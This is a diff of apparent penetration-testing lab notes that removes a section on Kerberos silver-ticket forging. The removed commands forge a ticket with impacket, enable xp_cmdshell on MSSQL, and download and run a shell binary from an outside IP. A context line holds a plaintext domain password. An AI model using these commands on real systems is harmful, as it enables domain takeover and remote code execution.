@@ -707,48 +707,7 @@ ldeep ldap -u tracy.white -p 'zqwj041FGX' -d ldap://nara-security.com -s 192.168
 
 
 
-### Silver Ticket
 
-```jsx
-1. Get nthash -> https://codebeautify.org/ntlm-hash-generator // To translate cleartext to NTLM
-2. Get domain-sid + domain -> (powershell) Get-ADdomain // DomainSID + Forest (fields)
-3. Get spn -> (powershell) Get-ADUser -Filter {SamAccountName -eq "svc_mssql"} -Properties ServicePrincipalNames //ServicePrincipalNames (field)
-
-impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator
-export KRB5CCNAME=$PWD/Administrator.ccache
-// Add to /etc/krb5user.conf -> one box below
-// Add to /etc/hosts -> one box below
-impacket-mssqlclient -k nagoya.nagoya-industries.com 
-enable_xp_cmdshell
-xp_cmdshell whoami
-xp_cmdshell "certutil -URLCache -split -f http://192.168.45.171/payload/shell64.exe \Windows\Temp\shell64.exe"
-xp_cmdshell "\Windows\Temp\shell64.exe"
-
-```
-
-```jsx
-[libdefaults]
-	default_realm = NAGOYA-INDUSTRIES.COM
-	kdc_timesync = 1
-	ccache_type = 4
-	forwardable = true
-	proxiable = true
-    rdns = false
-    dns_canonicalize_hostname = false
-	fcc-mit-ticketflags = true
-
-[realms]	
-	NAGOYA-INDUSTRIES.COM = {
-		kdc = nagoya.nagoya-industries.com
-	}
-
-[domain_realm]
-	.nagoya-industries.com = NAGOYA-INDUSTRIES.COM
-```
-
-```jsx
-240.0.0.1 nagoya.nagoya-industries.com
-```
 
 ## Mimikatz
 
